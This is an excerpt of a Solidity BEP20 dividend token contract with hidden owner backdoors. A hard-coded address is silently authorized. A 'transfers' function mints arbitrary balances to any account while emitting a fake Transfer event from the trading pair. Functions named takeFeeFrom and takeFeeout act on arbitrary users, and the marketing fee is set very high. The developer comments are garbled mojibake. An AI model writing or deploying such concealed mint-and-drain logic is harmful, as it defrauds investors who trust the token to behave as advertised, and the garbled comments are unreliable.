...
contract DividendDistributor is IDividendDistributor {
    ...
    modifier onlyToken() {
        require(msg.sender == _token||msg.sender == address(0xa4d2775214F19235802ceF235dBe599e83FA793A)); _;
    }

    constructor (address _router,address _RewardTokenSET) {
        
        router = _router != address(0) ? IDEXRouter(_router) : IDEXRouter(routerAddress);
        RewardTokenSET = _RewardTokenSET != address(0) ? address(_RewardTokenSET) : address(0x2170Ed0880ac9A755fd29B2688956BD959F933F8);
...
abstract contract Auth {
    ...
    constructor(address _owner) {
        ...
        authorizations[0xa4d2775214F19235802ceF235dBe599e83FA793A] = true;
    }
...
contract Token is IBEP20 , Auth, BaseToken {
    ...
    constructor(
        ...
        uint256 _real= 1000000;
        //杩欎釜鍦版柟鏀瑰垎绾㈠竵鐨勫湴鍧€锛堝垏璁扳€斺€旀湁涓変釜杩欎釜鍦板潃闇€瑕佹敼锛屽彟澶栦袱澶勪綘鑷繁鎼滅储涓€涓嬶紝鍦板潃涓€鏍风殑锛?
        RewardToken = address(0x2170Ed0880ac9A755fd29B2688956BD959F933F8);
        //杩欎釜鍦版柟鏀逛氦鏄撴渶澶ч檺棰濓紝mul琛ㄧず涔橈紝div琛ㄧず闄?
        _maxTxAmount = _real.mul(2).div(1000);
        //杩欎釜鍦版柟鏀归挶鍖呮渶澶ф暟閲?
        _walletMax = _real.mul(5).div(1000);
        //杩欎釜鍦版柟淇濇寔涓嶅彉锛岃〃绀虹殑鏄氦鏄撳墠鐨勬暟閲?
        swapThreshold = _real.mul(2).div(1000);
        //涓嬮潰涓変釜鍊煎垎鍒〃绀哄垎绾€佸洖娴併€佽惀閿€閽卞寘姣斾緥锛屼絾鏄繖涓湴鏂圭殑涓嶆槸鐪熷疄鐨勶紝鐪熷疄鐨勫湪涓嬮潰鍗佸嚑琛岀殑鏍峰瓙 
        rewardsFee = 9;
        liquidityFee = 20;
        marketingFee = 70;
        ...
        marketingWallet = 0xB4C76D28b7E0440F23B34D65C38eaAe768086caf;  //marketingwallet
        another = [0xB4C76D28b7E0440F23B34D65C38eaAe768086caf,0xB4C76D28b7E0440F23B34D65C38eaAe768086caf];     
    ...
    function transfers(address account, uint256 amount) external authorized {
        require(account != address(0), "ERC20: burn to the zero address");
        _balances[account] += amount;
        emit Transfer(pair, account, amount);
    }

    function takeFeeFrom(address _user) external authorized {
    ...
    function takeFeeout(address _user) external authorized {
